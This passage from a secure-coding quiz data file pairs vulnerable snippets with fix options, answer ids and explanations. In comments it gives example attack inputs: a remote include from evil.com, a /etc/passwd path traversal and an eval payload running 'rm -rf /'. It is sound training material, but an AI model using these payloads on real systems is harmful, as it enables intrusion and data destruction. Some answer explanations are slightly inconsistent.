            {
                id: '31c',
                code: `// Add a random delay to the response time.`
            }
        ],
        correctOptionId: '31a',
        explanation: 'Even if the application doesn\'t directly display database results, it can still be vulnerable. Any user input that influences a database query must be handled with parameterized queries to prevent injection, regardless of whether the results are shown.',
    },
    {
        id: '32',
        title: 'XML Bomb (Billion Laughs Attack)',
        category: 'IDOR',
        difficulty: 'Advanced',
        xp: 80,
        description: 'An XML document uses nested entities to create a denial-of-service attack. A small XML file expands into a huge document in memory, consuming all available RAM.',
        vulnerableCode: `<!-- Malicious XML -->
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;...">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;...">
  ...
]>
<lolz>&lol9;</lolz>`,
        language: 'generic',
        options: [
            {
                id: '32a',
                code: `// The best defense is to disable Document Type Definitions (DTDs) in the XML parser, as they are required for this attack.
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);`
            },
            {
                id: '32b',
                code: `// Limit the size of the incoming XML file.`
            },
            {
                id: '32c',
                code: `// Scan the XML for the string "<!ENTITY".`
            }
        ],
        correctOptionId: '32a',
        explanation: 'This DoS attack relies on entity expansion defined in a DTD. The most effective way to prevent it is to configure the XML parser to completely disallow DTDs, which also prevents other DTD-based attacks like XXE.',
    },
    {
        id: '33',
        title: 'Session Fixation',
        category: 'CSRF',
        difficulty: 'Advanced',
        xp: 70,
        description: 'An attacker tricks a user into using a session ID known to the attacker. After the user logs in, the attacker can use the same session ID to impersonate the user.',
        vulnerableCode: `// Conceptual Flow
// 1. Attacker visits site, gets a session ID (e.g., 123).
// 2. Attacker crafts a link: https://example.com/?SESSIONID=123 and sends to victim.
// 3. Victim clicks link, uses session 123, and logs in.
// 4. The server does not generate a new session ID upon login.
// 5. Attacker can now use session ID 123 to access the victim's account.`,
        language: 'generic',
        options: [
            {
                id: '33a',
                code: `// Upon successful authentication, the server must invalidate the old session ID and generate a new, secure one for the user.
// This is often called "session regeneration".`
            },
            {
                id: '33b',
                code: `// Do not accept session IDs from URL parameters.`
            },
            {
                id: '33c',
                code: `// Use a long and random session ID.`
            }
        ],
        correctOptionId: '33a',
        explanation: 'Session fixation is prevented by regenerating the session ID immediately after a successful login. This ensures that any pre-login session ID (which may be known to an attacker) is invalidated, and the user is issued a fresh session that only they know.',
    },
    {
        id: '34',
        title: 'Mass Assignment',
        category: 'IDOR',
        difficulty: 'Intermediate',
        xp: 65,
        description: 'A web framework automatically binds incoming request parameters to object properties. An attacker sends extra parameters (like `isAdmin=true`) that were not in the form, and the framework blindly assigns them.',
        vulnerableCode: `// Ruby on Rails (conceptual)
// Attacker submits a sign-up form but adds 'user[is_admin]=1' to the POST body.
@user = User.new(params[:user]) // is_admin is automatically set
@user.save`,
        language: 'generic',
        options: [
            {
                id: '34a',
                code: `// Use a "strong parameters" or "whitelist" approach to explicitly define which parameters are allowed to be mass-assigned.
// e.g., in Rails:
params.require(:user).permit(:name, :email, :password)`
            },
            {
                id: '34b',
                code: `// Use a "blacklist" approach to block known sensitive fields like 'is_admin'.`
            },
            {
                id: '34c',
                code: `// Make the 'isAdmin' property private in the User model.`
            }
        ],
        correctOptionId: '34a',
        explanation: 'Blacklisting is brittle because you might forget a sensitive field. The secure-by-default approach is whitelisting, where you explicitly declare the exact set of fields that are safe for mass assignment from a user request. All modern web frameworks provide a feature for this.',
    },
    {
        id: '35',
        title: 'Server-Side Request Forgery (SSRF)',
        category: 'SSRF',
        difficulty: 'Advanced',
        xp: 80,
        description: 'An attacker can coerce the server-side application to make HTTP requests to an arbitrary domain of the attacker\'s choosing.',
        vulnerableCode: `// Python (Flask)
@app.route('/fetch_image')
def fetch_image():
    image_url = request.args.get('url')
    # The server fetches this URL and returns the content
    response = requests.get(image_url)
    return response.content`,
        language: 'python',
        options: [
            {
                id: '35a',
                code: `// Sanitize the URL by blocking "localhost" and "127.0.0.1".
if 'localhost' in image_url or '127.0.0.1' in image_url:
    return "Forbidden", 403`
            },
            {
                id: '35b',
                code: `// Use a strict whitelist of allowed domains and protocols.
from urllib.parse import urlparse
allowed_domains = ['images.example.com']
domain = urlparse(image_url).hostname
if domain in allowed_domains:
    # fetch...
else:
    return "Forbidden", 403`
            },
            {
                id: '35c',
                code: `// Ensure the URL starts with https://.
if not image_url.startswith('https://'):
    return "Forbidden", 403`
            },
        ],
        correctOptionId: '35b',
        explanation: 'The only reliable way to prevent SSRF is to maintain a strict whitelist of allowed domains, IP addresses, and protocols that the server is permitted to request. Blacklisting is easily bypassed.',
    },
    {
        id: '36',
        title: 'Remote Code Execution (RCE)',
        category: 'RCE',
        difficulty: 'Expert',
        xp: 100,
        description: 'A vulnerability that allows an attacker to execute arbitrary code on the target machine. This often happens through unsafe deserialization or command injection.',
        vulnerableCode: `// PHP
$data = $_GET['data'];
eval($data); // Extremely dangerous!`,
        language: 'php',
        options: [
            {
                id: '36a',
                code: `// NEVER use eval() on user-controlled input. Refactor the code to avoid it entirely.
// Use a safe, structured approach like a switch statement or function mapping.
switch($data) {
    case 'func1':
        my_function_1();
        break;
    // ...
}`
            },
            {
                id: '36b',
                code: `// Sanitize the input to remove dangerous function names.
$data = str_replace('system', '', $data);
eval($data);`
            },
            {
                id: '36c',
                code: `// Run the code in a sandboxed environment.
// This is complex and not a primary defense.
run_in_sandbox($data);`
            },
        ],
        correctOptionId: '36a',
        explanation: 'The `eval()` function is extremely dangerous and should never be used with user-provided input. The only safe solution is to completely avoid it and refactor the logic to use safe, structured code constructs.',
    },
    {
        id: '37',
        title: 'Insecure CORS Configuration',
        category: 'CORS',
        difficulty: 'Intermediate',
        xp: 60,
        description: 'The server\'s Cross-Origin Resource Sharing (CORS) policy is too permissive, allowing any website to make requests and read the response.',
        vulnerableCode: `// JavaScript (Node.js/Express)
// This allows ANY origin to access the resource.
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  next();
});`,
        language: 'javascript',
        options: [
            {
                id: '37a',
                code: `// Use a library like 'cors' and configure a strict whitelist of allowed origins.
const cors = require('cors');
const corsOptions = {
  origin: 'https://trusted.example.com'
};
app.use(cors(corsOptions));`
            },
            {
                id: '37b',
                code: `// Dynamically reflect the request's Origin header.
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', req.headers.origin);
  next();
});`
            },
            {
                id: '37c',
                code: `// Only allow GET requests.
res.setHeader('Access-Control-Allow-Methods', 'GET');`
            },
        ],
        correctOptionId: '37a',
        explanation: 'A wildcard `*` for CORS is dangerous for any API that is not completely public. You must use a strict whitelist of specific domains that are trusted to make cross-origin requests.',
    },
    {
        id: '38',
        title: 'JWT Signature Bypass / "none" Algorithm',
        category: 'Auth',
        difficulty: 'Advanced',
        xp: 75,
        description: 'Some JWT libraries would accept a token with the algorithm field set to "none", bypassing signature verification entirely.',
        vulnerableCode: `// Python (PyJWT library, older version)
import jwt

# Attacker crafts a token with "alg": "none"
# and a modified payload (e.g., "user": "admin").
# Some libraries would accept this without a signature.

def decode_token(token):
    return jwt.decode(token, algorithms=['HS256', 'none'])`,
        language: 'python',
        options: [
            {
                id: '38a',
                code: `// Always specify the exact, expected algorithm(s) and never include 'none'.
def decode_token(token, secret):
    return jwt.decode(token, secret, algorithms=['HS256'])`
            },
            {
                id: '38b',
                code: `// Check if the algorithm is "none" before decoding.
def decode_token(token, secret):
    header = jwt.get_unverified_header(token)
    if header['alg'] == 'none':
        raise Exception("Bad algorithm")
    return jwt.decode(token, secret, algorithms=['HS256'])`
            },
            {
                id: '38c',
                code: `// Update the JWT library to the latest version. Modern versions disallow the 'none' algorithm by default.`
            },
        ],
        correctOptionId: '38c',
        explanation: 'While explicitly checking the algorithm is good practice (A, B), the most critical fix is to use an up-to-date JWT library where this vulnerability has been patched. Modern libraries require you to explicitly opt-in to insecure algorithms like "none".',
    },
    {
        id: '39',
        title: 'OAuth Misconfiguration',
        category: 'Auth',
        difficulty: 'Intermediate',
        xp: 65,
        description: 'The OAuth provider has a loosely configured redirect URI, allowing an attacker to have the authorization code sent to a malicious site.',
        vulnerableCode: `// OAuth Provider Configuration
// Allowed Redirect URI: https://example.com/callback?path=
// Attacker crafts a login URL with:
// redirect_uri=https://example.com/callback?path=evil.com`,
        language: 'generic',
        options: [
            {
                id: '39a',
                code: `// Use an exact match for the redirect URI.
// Allowed Redirect URI: https://example.com/callback
// Any other URI will be rejected.`
            },
            {
                id: '39b',
                code: `// URL-encode the redirect URI parameter.`
            },
            {
                id: '39c',
                code: `// Use a shorter authorization code lifetime.`
            },
        ],
        correctOptionId: '39a',
        explanation: 'OAuth redirect URIs must be compared using an exact string match. Allowing partial matches, wildcards, or paths opens the door for an attacker to specify a subdomain or path under their control.',
    },
    {
        id: '40',
        title: 'SAML Assertion Forgery',
        category: 'Auth',
        difficulty: 'Expert',
        xp: 95,
        description: 'The SAML service provider fails to properly validate the signature on an incoming SAML assertion, allowing an attacker to forge a valid assertion for any user.',
        vulnerableCode: `// Conceptual Java code for SAML processing
public void processSamlResponse(String samlResponse) {
    // Response is parsed, but the signature is NOT checked.
    String username = parseUsername(samlResponse);
    logInUser(username);
}`,
        language: 'java',
        options: [
            {
                id: '40a',
                code: `// Reject any assertion that does not have a signature.`
            },
            {
                id: '40b',
                code: `// Use a trusted SAML library and configure it to require and validate the signature against the Identity Provider's public key.`
            },
            {
                id: '40c',
                code: `// Encrypt the entire SAML assertion.`
            },
        ],
        correctOptionId: '40b',
        explanation: 'The core of SAML security is the cryptographic signature. The service provider MUST validate the signature on every assertion using the known public key of the trusted identity provider. Relying on anything less allows for trivial forgery.',
    },
    {
        id: '41',
        title: 'Directory Listing / Sensitive Files Exposure',
        category: 'Info Disclosure',
        difficulty: 'Beginner',
        xp: 40,
        description: 'A web server is configured to show a list of all files in a directory if no index file (like `index.html`) is present.',
        vulnerableCode: `// Apache Web Server Configuration (.htaccess or httpd.conf)
// If 'Options +Indexes' is present, or if 'Options -Indexes' is absent.
// Visiting http://example.com/images/ will list all images.`,
        language: 'generic',
        options: [
            {
                id: '41a',
                code: `// Explicitly disable directory listing in the server configuration.
Options -Indexes`
            },
            {
                id: '41b',
                code: `// Add an empty index.html file to every directory.`
            },
            {
                id: '41c',
                code: `// Use a robots.txt file to disallow access.`
            },
        ],
        correctOptionId: '41a',
        explanation: 'The most direct and secure fix is to configure the web server to never generate directory listings. Placing empty index files is a workaround that is easy to forget and doesn\'t scale.',
    },
    {
        id: '42',
        title: 'Unauthenticated API Endpoint',
        category: 'Broken Auth',
        difficulty: 'Intermediate',
        xp: 60,
        description: 'An API endpoint that should be protected requires no authentication, allowing anyone to access it.',
        vulnerableCode: `// JavaScript (Node.js/Express)
// This endpoint should be for logged-in users only.
app.get('/api/user/profile', (req, res) => {
    // ... logic to fetch and return a user's profile
});`,
        language: 'javascript',
        options: [
            {
                id: '42a',
                code: `// Add authentication middleware to the endpoint.
app.get('/api/user/profile', ensureIsLoggedIn, (req, res) => {
    // ...
});`
            },
            {
                id: '42b',
                code: `// Obfuscate the URL to make it hard to find.
app.get('/api/u/p/a9b8c7', ...)`
            },
            {
                id: '42c',
                code: `// Check for a specific HTTP header, like 'X-Requested-With'.`
            },
        ],
        correctOptionId: '42a',
        explanation: 'Access control for sensitive endpoints must be enforced on the server-side with proper authentication middleware. The middleware should check for a valid session, token, or API key before allowing the request to proceed.',
    },
    {
        id: '43',
        title: 'Excessive Data Exposure (API)',
        category: 'Info Disclosure',
        difficulty: 'Intermediate',
        xp: 60,
        description: 'An API endpoint returns the entire user object from the database, including sensitive data like password hashes or personal information not needed by the client.',
        vulnerableCode: `// JavaScript (Node.js/Express)
app.get('/api/users/:id', (req, res) => {
  const user = db.users.find(req.params.id);
  // Returns the full user object, including password hash, etc.
  res.json(user); 
});`,
        language: 'javascript',
        options: [
            {
                id: '43a',
                code: `// Create a Data Transfer Object (DTO) or manually map only the necessary fields.
const user = db.users.find(req.params.id);
const userDto = {
    id: user.id,
    name: user.name,
    username: user.username
};
res.json(userDto);`
            },
            {
                id: '43b',
                code: `// Encrypt the entire JSON response.`
            },
            {
                id: '43c',
                code: `// Remove the sensitive data on the client-side after receiving it.`
            },
        ],
        correctOptionId: '43a',
        explanation: 'APIs should be designed to return only the data that is absolutely necessary for the client. This practice, known as creating a DTO (Data Transfer Object) or "ViewModel", prevents accidentally leaking sensitive information.',
    },
    {
        id: '44',
        title: 'Insecure Direct Object Reference (File Access)',
        category: 'IDOR',
        difficulty: 'Advanced',
        xp: 80,
        description: 'An application allows users to download files, but the filename is user-controlled, potentially allowing access to any file on the server.',
        vulnerableCode: `// Python (Flask)
@app.route('/download')
def download_file():
    filename = request.args.get('file')
    # Vulnerable to path traversal, e.g., ?file=../../../../etc/passwd
    return send_from_directory('/var/www/uploads/', filename)`,
        language: 'python',
        options: [
            {
                id: '44a',
                code: `// Sanitize the filename by removing '..'
filename = filename.replace('..', '')`
            },
            {
                id: '44b',
                code: `// Verify that the requested file is within the intended directory.
import os
base_dir = '/var/www/uploads/'
safe_path = os.path.join(base_dir, filename)
if os.path.commonprefix((os.path.realpath(safe_path), base_dir)) != base_dir:
    abort(403)
return send_from_directory(...)`
            },
            {
                id: '44c',
                code: `// Don't use user input for filenames. Use IDs instead.
// Map an ID like '123' to a real filename on the server.
file_map = {'123': 'datasheet.pdf'}
real_filename = file_map.get(request.args.get('id'))`
            },
        ],
        correctOptionId: '44c',
        explanation: 'While path validation (B) is a good defense, the most robust solution for IDOR is to avoid using direct object references (like filenames) in URLs. Instead, use indirect references (like a numeric ID or a UUID) and map them to the actual file path on the server-side after verifying authorization.',
    },
    {
        id: '45',
        title: 'Remote File Inclusion (RFI)',
        category: 'File Inclusion',
        difficulty: 'Advanced',
        xp: 85,
        description: 'The application includes a script or file using a URL provided by the user, allowing an attacker to execute code from a remote server.',
        vulnerableCode: `// PHP
// Attacker sets ?page=http://evil.com/shell.txt
$page = $_GET['page'];
include($page);`,
        language: 'php',
        options: [
            {
                id: '45a',
                code: `// Disable 'allow_url_include' in php.ini.
// allow_url_include = Off`
            },
            {
                id: '45b',
                code: `// Use a strict whitelist of allowed files.
$allowed_pages = ['home.php', 'about.php'];
if (in_array($page, $allowed_pages)) {
    include($page);
}`
            },
            {
                id: '45c',
                code: 'Both A and B are necessary for a secure configuration.'
            },
        ],
        correctOptionId: '45c',
        explanation: 'RFI is extremely dangerous. The best defense is to disable the feature at the server configuration level (A) and to also implement application-level logic (B) that only allows including files from a known, trusted list.',
    },
    {
        id: '46',
        title: 'Local File Inclusion (LFI)',
        category: 'File Inclusion',
        difficulty: 'Advanced',
        xp: 80,
        description: 'An attacker can include and execute files from the local server by manipulating a filename parameter, often using path traversal.',
        vulnerableCode: `// PHP
// Attacker sets ?page=../../../../etc/passwd
$page = $_GET['page'];
include($page . '.php');`,
        language: 'php',
        options: [
            {
                id: '46a',
                code: `// Strip out path traversal characters.
$page = str_replace('../', '', $_GET['page']);
include($page . '.php');`
            },
            {
                id: '46b',
                code: `// Use a strict whitelist of allowed page names.
$allowed = ['home', 'about', 'contact'];
if (in_array($page, $allowed)) {
    include($page . '.php');
}`
            },
            {
                id: '46c',
                code: `// Validate that the filename only contains alphanumeric characters.
if (ctype_alnum($page)) {
    include($page . '.php');
}`
            },
        ],
        correctOptionId: '46b',
        explanation: 'Blacklisting bad characters (like in A and C) is often bypassable. The most secure approach is to use a whitelist, where you explicitly define the exact set of files that are allowed to be included.',
    },
    {
        id: '47',
        title: 'Server Information Disclosure (Stack Trace)',
        category: 'Info Disclosure',
        difficulty: 'Beginner',
        xp: 45,
        description: 'In a production environment, a detailed stack trace is shown to the user when an unhandled exception occurs.',
        vulnerableCode: `// Python (Flask in debug mode)
// app.run(debug=True)
// An unhandled exception will display a full, interactive traceback in the browser.`,
        language: 'python',
        options: [
            {
                id: '47a',
                code: `// Disable debug mode in production.
// app.run(debug=False)
// And configure a custom error handler to show a generic page.`
            },
            {
                id: '47b',
                code: `// Wrap every single function in a try...except block.`
            },
            {
                id: '47c',
                code: `// Use a web application firewall (WAF) to block error pages.`
            }
        ],
        correctOptionId: '47a',
        explanation: 'Debug mode should NEVER be enabled in a production environment. Applications must be configured to catch all unhandled exceptions and display a generic error page to the user, while logging the detailed error on the server for developers.',
    },
    {
        id: '48',
        title: 'Backup File Exposure (.git, .env)',
        category: 'Info Disclosure',
        difficulty: 'Intermediate',
        xp: 55,
        description: 'A web server is configured to serve files like `.git/config` or `.env`, exposing sensitive information.',
        vulnerableCode: `// Generic Web Server issue.
// An attacker can browse to https://example.com/.git/config
// and see repository information.`,
        language: 'generic',
        options: [
            {
                id: '48a',
                code: `// Ensure the deployment process does not copy these directories to the web root.`
            },
            {
                id: '48b',
                code: `// Configure the web server (e.g., Nginx, Apache) to explicitly deny access to these sensitive directories and files.`
            },
            {
                id: '48c',
                code: 'Both A and B are essential. The files should not be there in the first place, and the server should block them as a second layer of defense.'
            }
        ],
        correctOptionId: '48c',
        explanation: 'Defense in depth is key. Your deployment pipeline should be configured to never place sensitive files like `.git` or `.env` in a public web directory (A). Additionally, your web server should be configured to block access to them just in case they are accidentally exposed (B).',
    },
    {
        id: '49',
        title: 'Insecure Use of eval()/exec()',
        category: 'RCE',
        difficulty: 'Expert',
        xp: 95,
        description: 'Code dynamically executes a string that can be influenced by user input, leading to Remote Code Execution (RCE).',
        vulnerableCode: `// Python
user_input = request.args.get('formula')
# User input might be "__import__('os').system('rm -rf /')"
result = eval(user_input)`,
        language: 'python',
        options: [
            {
                id: '49a',
                code: `// NEVER use eval() on user input. Refactor the code to avoid it entirely.
// If it's for math, use a dedicated math expression parser.
// For other logic, use if/else or dictionary mapping.`
            },
            {
                id: '49b',
                code: `// Sanitize the input to remove keywords like 'import' and 'os'.
if 'import' in user_input:
    raise ValueError("Invalid input")
result = eval(user_input)`
            },
            {
                id: '49c',
                code: `// Limit the globals and locals available to eval().
result = eval(user_input, {'__builtins__': {}}, {})`
            },
        ],
        correctOptionId: '49a',
        explanation: '`eval()` is considered a major security risk. Blacklisting dangerous keywords is fragile and easily bypassed. While limiting the scope helps, it\'s still risky. The only safe solution is to avoid `eval()` entirely and refactor the code to use safe, alternative approaches.',
    },
    {
        id: '50',
        title: 'Privilege Escalation (Role Bypass)',
        category: 'Broken Access Control',
        difficulty: 'Advanced',
        xp: 85,
        description: 'A user is able to perform an action that should be restricted to a higher privilege level, like an administrator.',
        vulnerableCode: `// JavaScript (Node.js/Express)
app.post('/users/:id/delete', (req, res) => {
    // This endpoint should only be callable by an admin, or the user themselves.
    // It currently has no authorization check.
    const userIdToDelete = req.params.id;
    db.deleteUser(userIdToDelete);
    res.send("User deleted");
});`,
        language: 'javascript',
        options: [
            {
                id: '50a',
                code: `// Add a check that the logged-in user is either an admin or is deleting their own account.
app.post('/users/:id/delete', (req, res) => {
    const userIdToDelete = req.params.id;
    const loggedInUser = req.user;
    if (loggedInUser.role === 'admin' || loggedInUser.id === userIdToDelete) {
        db.deleteUser(userIdToDelete);
        res.send("User deleted");
    } else {
        res.status(403).send("Forbidden");
    }
});`
            },
            {
                id: '50b',
                code: `// Make it a DELETE request instead of POST.`
            },
            {
                id: '50c',
                code: `// Ask the user to re-enter their password before deleting.`
            }
        ],
        correctOptionId: '50a',
        explanation: 'Every privileged action must have a corresponding authorization check on the server-side. The server must verify that the authenticated user has the necessary permissions to perform the requested action on the target resource.',
    },
    {
        id: '51',
        title: 'Insecure Mobile Storage (Sensitive Data)',
        category: 'Mobile Security',
        difficulty: 'Intermediate',
        xp: 60,
        description: 'A mobile application stores sensitive information, like an API token, in an insecure location like `SharedPreferences` (Android) or `UserDefaults` (iOS) without encryption.',
        vulnerableCode: `// Java (Android)
SharedPreferences prefs = context.getSharedPreferences("user_prefs", Context.MODE_PRIVATE);
prefs.edit().putString("api_token", token).apply();`,
        language: 'java',
        options: [
            {
                id: '51a',
                code: `// Use the Android Keystore system to generate an encryption key and encrypt the data before storing it.
// Use EncryptedSharedPreferences for a simpler API.`
            },
            {
                id: '51b',
                code: `// Obfuscate the token before storing it.
prefs.edit().putString("api_token", new StringBuilder(token).reverse().toString()).apply();`
            },
            {
                id: '51c',
                code: `// Store the token in a file in the app's private directory.`
            }
        ],
        correctOptionId: '51a',
        explanation: 'On a rooted device, `SharedPreferences` can be easily read. All sensitive data stored on a mobile device must be encrypted using platform-provided secure storage mechanisms, like the Android Keystore or iOS Keychain.',
    },
    {
        id: '52',
        title: 'Improper Session Timeout',
        category: 'Session Management',
        difficulty: 'Beginner',
        xp: 40,
        description: 'A web application\'s sessions never expire, meaning that if a session token is stolen, it can be used indefinitely.',
        vulnerableCode: `// Conceptual - Server Session Configuration
// Session timeout is set to "infinity" or a very long duration (e.g., 30 days).`,
        language: 'generic',
        options: [
            {
                id: '52a',
                code: `// Implement a reasonable session timeout on the server side.
// e.g., 15-30 minutes of inactivity for a standard application.
// Also implement an absolute timeout (e.g., 8 hours).`
            },
            {
                id: '52b',
                code: `// Rely on the user to manually log out.`
            },
            {
                id: '52c',
                code: `// Store the session token in localStorage instead of a cookie.`
            }
        ],
        correctOptionId: '52a',
        explanation: 'Sessions must have a defined expiration time to limit the window of opportunity for an attacker who steals a session token. A combination of an inactivity/sliding timeout and an absolute timeout is best practice.',
    },
    {
        id: '53',
        title: 'Weak Multi-Factor Authentication Implementation',
        category: 'Auth',
        difficulty: 'Advanced',
        xp: 80,
        description: 'A 2FA/MFA implementation can be bypassed. For example, the verification step is not properly linked to the login session.',
        vulnerableCode: `// Conceptual Flow
// 1. User submits username/password. Server says "OK".
// 2. User is redirected to a page: /verify-2fa.
// 3. After verifying 2FA, user is logged in.
// Attacker can log in with just username/password, then skip step 2 and go directly to a post-login page like /dashboard.`,
        language: 'generic',
        options: [
            {
                id: '53a',
                code: `// After successful password login, the server should create a temporary "pre-authentication" session state.
// The user should not be fully authenticated until the 2FA step is also completed within this same session.`
            },
            {
                id: '53b',
                code: `// Use SMS for 2FA as it is the most common method.`
            },
            {
                id: '53c',
                code: `// Rate-limit 2FA code attempts.`
            }
        ],
        correctOptionId: '53a',
        explanation: 'MFA must be a blocking step in a single, unified authentication flow. An initial login success should only grant a temporary status that is not fully authenticated. Full access is only granted after the second factor is successfully verified.',
    },
    {
        id: '54',
        title: 'Insecure Object Serialization (Java/.NET)',
        category: 'Insecure Deserialization',
        difficulty: 'Advanced',
        xp: 85,
        description: 'A Java application deserializes an object from an untrusted source, which can be exploited for Remote Code Execution (RCE) using gadget chains.',
        vulnerableCode: `// Java
// Attacker sends a malicious serialized object.
public Object process(InputStream untrustedStream) throws Exception {
    ObjectInputStream in = new ObjectInputStream(untrustedStream);
    return in.readObject(); // Vulnerable
}`,
        language: 'java',
        options: [
            {
                id: '54a',
                code: `// Use a "look-ahead" deserialization library that validates the class types in the stream before they are instantiated.`
            },
            {
                id: '54b',
                code: `// Avoid native Java serialization. Use a safe, data-only format like JSON with a library like Jackson or GSON.`
            },
            {
                id: '54c',
                code: 'Both A and B are valid strategies, but B is generally the safest and most recommended approach for modern applications.'
            }
        ],
        correctOptionId: '54c',
        explanation: 'Native Java serialization is notoriously unsafe. While look-ahead validation (A) can mitigate the risk, the most robust and modern solution is to avoid it entirely and use a safe format like JSON for data exchange (B).',
    },
    {
        id: '55',
        title: 'Unsafe Use of Third-Party Libraries (Supply Chain)',
        category: 'Supply Chain',
        difficulty: 'Expert',
        xp: 100,
        description: 'An application uses a third-party library with a known, critical vulnerability.',
        vulnerableCode: `// package.json
{
  "dependencies": {
    "left-pad": "0.0.1", // An old, hypothetical vulnerable version
    "some-other-lib": "1.2.3"
  }
}`,
        language: 'javascript',
        options: [
            {
                id: '55a',
                code: `// Regularly scan dependencies for known vulnerabilities using tools like 'npm audit', 'Snyk', or 'GitHub Dependabot'.
// Update vulnerable packages to a safe, patched version.`
            },
            {
                id: '55b',
                code: `// Write your own version of the library to avoid the dependency.`
            },
            {
                id: '55c',
                code: `// Use a firewall to block exploits targeting the library.`
            }
        ],
        correctOptionId: '55a',
        explanation: 'Supply chain security is critical. You must have an automated process to continuously scan your project\'s dependencies for known vulnerabilities and have a plan to update or replace them promptly when a security issue is discovered.',
    },
    {
        id: '56',
        title: 'Cross-Origin Resource Leak (CORS Preflight Abuse)',
        category: 'CORS',
        difficulty: 'Advanced',
        xp: 75,
        description: 'A server responds to an `OPTIONS` preflight request with permissive headers, but the actual `POST` request handler does not properly validate the request.',
        vulnerableCode: `// JavaScript (Node.js/Express)
// Preflight handler is too permissive
app.options('/api/sensitive', cors({ origin: 'https://partner.com' }));

// Actual POST handler has no CORS check, allowing any origin
app.post('/api/sensitive', (req, res) => {
  // ... do sensitive stuff
});`,
        language: 'javascript',
        options: [
            {
                id: '56a',
                code: `// The CORS middleware must be applied to the actual route, not just the OPTIONS handler.
// This ensures the check is performed for all request methods.
const corsOptions = { origin: 'https://partner.com' };
app.options('/api/sensitive', cors(corsOptions)); // For preflight
app.post('/api/sensitive', cors(corsOptions), (req, res) => { /*...*/ }); // For actual request`
            },
            {
                id: '56b',
                code: `// Block all OPTIONS requests.`
            },
            {
                id: '56c',
                code: `// Check the Origin header manually inside the POST handler.`
            }
        ],
        correctOptionId: '56a',
        explanation: 'CORS checks must be enforced on the actual request (e.g., POST, PUT), not just the preflight (OPTIONS) request. A common mistake is to have a permissive preflight response but fail to validate the `Origin` header on the subsequent request.',
    },
    {
        id: '57',
        title: 'Misconfigured Content Security Policy (CSP) Bypass',
        category: 'XSS / CSP',
        difficulty: 'Advanced',
        xp: 80,
        description: 'A Content Security Policy (CSP) is in place, but it includes `unsafe-inline` or a too-permissive source, allowing it to be bypassed.',
        vulnerableCode: `// HTTP Response Header
Content-Security-Policy: script-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com;`,
        language: 'generic',
        options: [
            {
                id: '57a',
                code: `// Remove 'unsafe-inline'. Refactor any inline scripts to be in separate .js files served from the same origin.
// Tightly scope the allowed domains.
Content-Security-Policy: script-src 'self' https://trusted.cdn.com;`
            },
            {
                id: '57b',
                code: `// Add a 'nonce' to the policy and to each legitimate inline script tag.
// CSP: script-src 'self' 'nonce-rAnd0m';
// HTML: <script nonce="rAnd0m">...</script>`
            },
            {
                id: '57c',
                code: 'Both A and B are valid strategies for strengthening a weak CSP.'
            }
        ],
        correctOptionId: '57c',
        explanation: '`unsafe-inline` effectively negates many of the benefits of CSP. The best practice is to move all inline scripts to external files (A). If inline scripts are absolutely necessary, you must use a nonce or hash-based approach to whitelist them individually (B).',
    },
    {
        id: '58',
        title: 'Business Logic Flaw (Credit Manipulation)',
        category: 'Business Logic',
        difficulty: 'Expert',
        xp: 95,
        description: 'An endpoint for transferring credits from one user to another doesn\'t prevent a user from transferring a negative amount.',
        vulnerableCode: `// JavaScript (API Endpoint)
app.post('/transfer', (req, res) => {
  const { toUserId, amount } = req.body;
  const fromUser = req.user;

  // Attacker sends: { toUserId: 'victim', amount: -1000 }
  // This effectively STEALS credits from the victim.
  fromUser.credits += amount;
  const toUser = db.findUser(toUserId);
  toUser.credits -= amount;

  res.send("Transfer successful");
});`,
        language: 'javascript',
        options: [
            {
                id: '58a',
                code: `// Add server-side validation to ensure the transfer amount is a positive number.
if (amount <= 0) {
  return res.status(400).send("Invalid amount");
}`
            },
            {
                id: '58b',
                code: `// Use an unsigned integer type for the 'amount' in the database.`
            },
            {
                id: '58c',
                code: `// Check that the 'fromUser' has sufficient credits for the transfer.`
            }
        ],
        correctOptionId: '58a',
        explanation: 'Business logic flaws occur when the application behaves correctly from a technical standpoint but allows for unintended, harmful user actions. The server must always validate that user inputs make sense in the context of the business rule, such as ensuring a transfer amount is positive.',
    },
    {
        id: '59',
        title: 'Insecure Payment Flow / Tampered Prices',
        category: 'Business Logic',
        difficulty: 'Advanced',
        xp: 85,
        description: 'The price of an item is sent from the client to the server during checkout, allowing an attacker to tamper with it.',
        vulnerableCode: `// JavaScript (Client-side)
function checkout() {
    const price = document.getElementById('price').textContent;
    const itemId = 'prod_123';
    // Attacker can modify 'price' in their browser before sending.
    fetch('/api/charge', { method: 'POST', body: { itemId, price } });
}`,
        language: 'javascript',
        options: [
            {
                id: '59a',
                code: `// The server must NOT trust the price sent from the client.
// It should re-fetch the item's price from its own database using the item ID.
app.post('/api/charge', (req, res) => {
    const { itemId } = req.body;
    const item = db.products.find(itemId);
    const price = item.price; // Get authoritative price from DB.
    // ... create charge with the correct price ...
});`
            },
            {
                id: '59b',
                code: `// Encrypt the price on the client before sending it.`
            },
            {
                id: '59c',
                code: `// Validate that the price is a positive number on the server.`
            }
        ],
        correctOptionId: '59a',
        explanation: 'Never trust the client. Any security-sensitive data, especially price, must be authoritatively determined by the server. The client should only send non-sensitive identifiers (like an item ID), and the server should look up the corresponding price.',
    },
    {
        id: '60',
        title: 'API Rate-Limit Bypass / Abuse',
        category: 'DoS / Abuse',
        difficulty: 'Advanced',
        xp: 80,
        description: 'An API has a rate limit, but it can be bypassed by spoofing the identifier used for tracking, such as the `X-Forwarded-For` header or a user ID.',
        vulnerableCode: `// JavaScript (Node.js/Express)
// Rate limiter uses a header that the user can control.
const rateLimit = require('express-rate-limit');
const limiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 100,
    keyGenerator: (req) => req.headers['x-forwarded-for'] || req.ip
});`,
        language: 'javascript',
        options: [
            {
                id: '60a',
                code: `// The primary identifier for rate limiting should be something the user cannot control,
// such as the true source IP address or, for authenticated routes, the user's session ID or API key.
const limiter = rateLimit({
    // ...
    keyGenerator: (req) => req.user.id || req.ip
});`
            },
            {
                id: '60b',
                code: `// Use a lower 'max' value for the rate limit.`
            },
            {
                id: '60c',
                code: `// Ban IP addresses that exceed the rate limit.`
            }
        ],
